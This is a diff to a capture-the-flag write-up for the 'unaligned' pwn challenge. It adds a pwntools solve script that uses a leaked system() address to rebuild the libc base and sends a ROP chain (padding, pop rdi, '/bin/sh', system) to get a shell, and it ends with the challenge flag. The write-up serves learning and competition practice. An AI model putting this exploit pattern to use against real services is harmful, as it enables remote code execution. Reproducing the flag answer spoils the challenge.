@@ -28,6 +28,39 @@ Let's try the following payload:
 
 We run it, and sure enough, we get a shell :).
 
+# Solve Script
+
+```python
+from pwn import *
+
+elf = ELF('./unaligned')
+context.binary = elf
+p = process(elf.path)
+#p = remote(host='unaligned.bsides.shellmates.club', port=443, ssl=True)
+libc = ELF('./libc.so.6')
+
+p.recvuntil('Gift: ')
+system = int(p.recv(14), 16)
+
+log.warn('system offset at : ' + str(hex(libc.symbols['system'])))
+
+libc.address = system - libc.symbols['system']
+
+log.warn('system at : ' + str(hex(system)))
+
+bin_sh = p64(next(libc.search(b'/bin/sh\0')))
+
+padding = b'B' * 40
+
+system = p64(system + 0x1b)
+
+pop_rdi = p64(libc.address + 0x2164f)
+
+p.sendline(padding + pop_rdi + bin_sh + system)
+
+p.interactive()
+```
+
 # Flag
 
 `shellmates{SOrRY_fOR_f0RciBLy_Untify1ng_0ne_g4DGet_CoN$}`
